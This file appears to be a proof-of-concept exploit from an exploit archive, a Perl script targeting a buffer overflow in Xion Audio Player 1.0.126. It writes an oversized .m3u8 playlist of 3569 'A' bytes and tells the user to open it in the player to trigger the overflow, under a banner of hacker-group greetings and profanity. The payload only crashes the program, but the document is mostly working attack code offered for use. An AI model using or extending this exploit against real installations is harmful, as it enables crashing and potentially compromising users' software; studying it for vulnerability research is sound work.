@@ -1,0 +1,35 @@
+===================================================
+Xion Audio Player 1.0.126 (.m3u8) Buffer Overflow Vulnerability
+===================================================
+
+.....................X-SHADOW ; ThBa7 ; KloofQ8 ; LeGEnD ; abada ...
+.......................................Fuck ALL lamers top-team................... 
+
+#!/usr/bin/perl
+#Title: Xion Audio Player 1.0.126 (.m3u8) Buffer Overflow Vulnerability
+
+#Author    :   anT!-Tr0J4n
+
+#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com
+
+#Greetz    :   Dev-PoinT.com ; GlaDiatOr,SILVER STAR , HoBeeZ, Coffin Of Evil
+
+#special thanks    :   r0073r,Sid3^effects,L0rd CruSad3r,SeeMe,Sonic,gunslinger_,Sn!pEr.S!Te,n4pst3rr,indoushka, KnocKout,SONiC,ZoRLu
+ 
+#Home     :   www.Dev-PoinT.com  $ http://1337db.com/
+
+#Software :  http://xion.r2.com.au
+
+#Tested on:   Windows XP sp3
+
+#
+###################################################################
+ 
+my $file= "inj3ct0r team.m3u8";
+ 
+my $junk= "\x41" x  3569;
+  
+open($FILE, ">$file");
+print($FILE $junk);
+close($FILE);
+print("File created succesufully , open  it with Xion Audio Player and press the Play button");
